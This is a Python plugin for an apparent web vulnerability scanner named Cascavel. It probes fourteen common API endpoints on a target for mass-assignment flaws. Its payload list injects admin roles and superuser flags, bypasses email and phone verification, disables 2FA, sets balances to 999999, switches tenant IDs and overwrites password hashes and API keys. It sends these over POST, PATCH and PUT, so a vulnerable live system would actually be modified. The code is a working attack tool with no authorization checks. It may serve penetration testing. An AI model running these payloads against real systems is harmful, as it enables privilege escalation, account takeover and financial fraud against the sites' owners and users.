# plugins/mass_assignment.py — Cascavel 2026 Intelligence
import json

import requests

ENDPOINTS = [
    "/api/users",
    "/api/v1/users",
    "/api/register",
    "/api/signup",
    "/api/profile",
    "/api/v1/profile",
    "/api/account",
    "/api/v1/account",
    "/api/settings",
    "/api/v1/settings",
    "/api/me",
    "/api/v1/me",
    "/api/user/update",
    "/api/v1/user/update",
]

# ──────────── DANGEROUS FIELDS (2026 Expanded) ────────────
DANGEROUS_FIELDS = [
    # Privilege escalation
    ("role", "admin", "CRITICO", "Privilege escalation"),
    ("isAdmin", True, "CRITICO", "Admin flag injection"),
    ("is_admin", True, "CRITICO", "Admin flag injection"),
    ("admin", True, "CRITICO", "Admin boolean set"),
    ("is_superuser", True, "CRITICO", "Superuser escalation"),
    ("privilege", "admin", "ALTO", "Privilege level change"),
    ("access_level", 999, "CRITICO", "Max access level"),
    ("permissions", ["admin", "write", "delete"], "CRITICO", "Full permissions"),
    ("user_type", "admin", "ALTO", "User type change"),
    ("group", "administrators", "ALTO", "Group assignment"),
    # Verification bypass
    ("verified", True, "ALTO", "Email verification bypass"),
    ("email_verified", True, "ALTO", "Email verification bypass"),
    ("active", True, "MEDIO", "Account activation bypass"),
    ("approved", True, "MEDIO", "Approval bypass"),
    ("phone_verified", True, "ALTO", "Phone verification bypass"),
    ("two_factor_enabled", False, "ALTO", "2FA disable"),
    # Financial
    ("balance", 999999, "CRITICO", "Balance manipulation"),
    ("credit", 999999, "CRITICO", "Credit manipulation"),
    ("tier", "enterprise", "ALTO", "Tier upgrade"),
    ("plan", "unlimited", "ALTO", "Plan upgrade"),
    ("subscription", "premium", "ALTO", "Subscription upgrade"),
    # Multi-tenant
    ("org_id", 1, "CRITICO", "Cross-org access"),
    ("tenant_id", 1, "CRITICO", "Cross-tenant access"),
    ("company_id", 1, "ALTO", "Cross-company access"),
    # Internal
    ("internal", True, "ALTO", "Internal flag"),
    ("debug", True, "MEDIO", "Debug mode"),
    ("password_hash", "injected", "CRITICO", "Password hash override"),
    ("api_key", "injected-key", "CRITICO", "API key override"),
]


def _test_mass_assign(target, endpoint, field, value, severity, desc):
    """Testa mass assignment enviando campo privilegiado."""
    url = f"http://{target}{endpoint}"
    payload = {"test_user": "cascavel_probe", field: value}
    try:
        # POST
        resp = requests.post(url, json=payload, timeout=8)
        if resp.status_code in (200, 201):
            try:
                body = resp.json()
                if field in json.dumps(body):
                    return {
                        "tipo": "MASS_ASSIGNMENT",
                        "endpoint": endpoint,
                        "campo": field,
                        "valor_injetado": str(value)[:30],
                        "severidade": severity,
                        "metodo": "POST",
                        "descricao": f"{desc} — campo '{field}' aceito e refletido!",
                    }
            except (json.JSONDecodeError, ValueError):
                pass
        if resp.status_code == 422:
            return {
                "tipo": "MASS_ASSIGN_FIELD_KNOWN",
                "endpoint": endpoint,
                "campo": field,
                "severidade": "MEIO",
                "descricao": f"Campo '{field}' reconhecido (422) — validação parcial",
            }

        # PATCH
        resp = requests.patch(url, json={field: value}, timeout=8)
        if resp.status_code in (200, 204):
            try:
                body = resp.json()
                if field in json.dumps(body):
                    return {
                        "tipo": "MASS_ASSIGNMENT_PATCH",
                        "endpoint": endpoint,
                        "campo": field,
                        "valor_injetado": str(value)[:30],
                        "severidade": severity,
                        "metodo": "PATCH",
                        "descricao": f"{desc} via PATCH!",
                    }
            except Exception:
                pass

        # PUT
        resp = requests.put(url, json={field: value}, timeout=8)
        if resp.status_code in (200, 204):
            try:
                body = resp.json()
                if field in json.dumps(body):
                    return {
                        "tipo": "MASS_ASSIGNMENT_PUT",
                        "endpoint": endpoint,
                        "campo": field,
                        "valor_injetado": str(value)[:30],
                        "severidade": severity,
                        "metodo": "PUT",
                        "descricao": f"{desc} via PUT!",
                    }
            except Exception:
                pass

    except Exception:
        pass
    return None


def run(target, ip, open_ports, banners):
    """
    Scanner Mass Assignment 2026-Grade — POST, PATCH, PUT, Hidden Fields.

    Técnicas: 28 dangerous fields (privilege/verification/financial/multi-tenant/
    internal), POST/PATCH/PUT testing, 14 API endpoints,
    422 response detection (field recognized), JSON response reflection analysis.
    """
    _ = (ip, open_ports, banners)
    vulns = []

    for endpoint in ENDPOINTS:
        for field, value, sev, desc in DANGEROUS_FIELDS:
            vuln = _test_mass_assign(target, endpoint, field, value, sev, desc)
            if vuln:
                vulns.append(vuln)
                break  # One finding per endpoint is enough

    return {
        "plugin": "mass_assignment",
        "versao": "2026.1",
        "tecnicas": [
            "post_assign",
            "patch_assign",
            "put_assign",
            "privilege_escalation",
            "verification_bypass",
            "financial_manipulation",
            "multi_tenant_bypass",
        ],
        "resultados": vulns if vulns else "Nenhum mass assignment detectado",
    }
